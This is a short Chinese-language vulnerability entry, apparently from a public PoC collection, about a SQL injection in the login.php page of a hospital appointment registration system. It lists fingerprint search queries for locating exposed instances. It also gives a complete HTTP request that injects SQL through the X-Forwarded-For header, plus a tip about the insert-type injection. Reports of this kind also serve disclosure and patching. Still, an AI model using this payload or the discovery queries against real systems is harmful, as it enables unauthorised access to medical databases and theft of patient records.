# 挂号系统login.php存在SQL注入漏洞

# 一、漏洞简介
挂号系统存在SQL注入，可能导致数据库信息泄露、恶意数据库操作

# 二、资产测绘
```plain
body="res/img/ht_box_back.gif" || body="/res/img/ht_box_top.gif" || body="/res/img/ht_box_bottom.gif" || body="dom_loaded.load(init);"
```


## 三、漏洞复现
```http
POST /m/login.php?op=login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Content-Type: application/x-www-form-urlencoded
x-forwarded-for: 127.0.0.1 'and exists(select * from mysql)-- 123

username=admin&password=admin&vcode=4997&to=&vcode_hash=03b498138c14b2d0515b5438808d6604
```


**<font style="color:#DF2A3F;">注入为insert类型，请勿使用sqlmap</font>**


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yfrf96eoc8tgqfau>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
